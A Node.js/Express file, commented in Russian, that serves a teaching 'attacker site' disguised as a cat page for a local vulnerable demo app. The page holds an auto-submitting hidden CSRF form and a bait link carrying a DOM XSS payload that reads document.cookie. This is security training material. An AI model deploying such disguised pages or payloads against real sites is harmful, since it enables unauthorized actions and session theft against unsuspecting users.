'use strict';

/**
 * Стенд «атакующего сайта».
 *
 * Это ОТДЕЛЬНЫЙ сайт на другом порту (по умолчанию 4000). Он играет роль
 * злоумышленника: пока жертва залогинена на DevBoard (http://localhost:3000),
 * заход на этот сайт пытается выполнить действия от её имени.
 *
 * Запуск: `npm run attacker`, затем открыть http://localhost:4000
 */

const express = require('express');

const app = express();
const VICTIM = process.env.VICTIM_URL || 'http://localhost:3000';

app.get('/', (_req, res) => {
  res.send(`<!doctype html>
<html lang="ru"><head><meta charset="utf-8"><title>Безобидный котик</title>
<style>body{font-family:system-ui,sans-serif;max-width:640px;margin:2rem auto;padding:0 1rem}</style>
</head><body>
  <h1>🐱 Смешные котики</h1>
  <p>Обычная страница. Но пока вы её смотрите, в фоне кое-что происходит…</p>

  <h2>Демонстрация CSRF</h2>
  <p>Форма ниже отправляется автоматически на DevBoard от вашего имени
     (если вы там залогинены). Токена у атакующего нет — но уязвимой
     версии он и не нужен.</p>

  <!-- CSRF: межсайтовый POST, использующий cookie жертвы -->
  <form id="csrf" action="${VICTIM}/comment" method="post">
    <input type="hidden" name="body"
           value="Это сообщение отправил чужой сайт через CSRF 😈">
  </form>
  <script>document.getElementById('csrf').submit();</script>

  <h2>Демонстрация DOM XSS</h2>
  <p>
    <a href="${VICTIM}/profile#name=${encodeURIComponent(
      '<img src=x onerror="alert(document.cookie)">'
    )}" target="_blank">Открыть ваш профиль 🎁</a>
  </p>
  <p>Ссылка ведёт на настоящий DevBoard, но несёт полезную нагрузку
     в части URL после #.</p>
</body></html>`);
});

if (require.main === module) {
  const port = process.env.ATTACKER_PORT || 4000;
  app.listen(port, () => {
    console.log(`Стенд атакующего на http://localhost:${port}`);
    console.log(`Цель (жертва): ${VICTIM}`);
  });
}

module.exports = app;
